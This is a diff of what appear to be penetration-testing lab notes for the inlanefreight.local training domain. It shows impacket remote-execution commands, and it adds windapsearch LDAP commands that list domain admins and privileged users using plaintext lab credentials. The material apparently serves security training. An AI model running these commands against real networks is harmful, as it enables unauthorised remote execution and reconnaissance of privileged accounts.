@@ -547,10 +547,33 @@ impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.125
 impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5
 ```
 
-
-
-
 ----------------
 
+### Windapsearch
 
 -----------------
+
+- Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.
+- Checking for domain admins,[link](https://github.com/ropnop/go-windapsearch/releases/)-:
+
+```bash
+windapsearch -m domain-admins --dc 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
+
+<img width="1234" height="652" alt="image" src="https://github.com/user-attachments/assets/40f52905-ff5b-40d6-bc3b-5cbc3b4f897e" />
+
+- Privileged users-:
+
+```bash
+windapsearch -m privileged-users  --dc 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
+
+<img width="1153" height="483" alt="image" src="https://github.com/user-attachments/assets/dd43d433-7525-4e37-b370-68c9c341a2b8" />
+
+-----------------
+
+### Bloodhound-python
+
+-----------------
+
+---------------
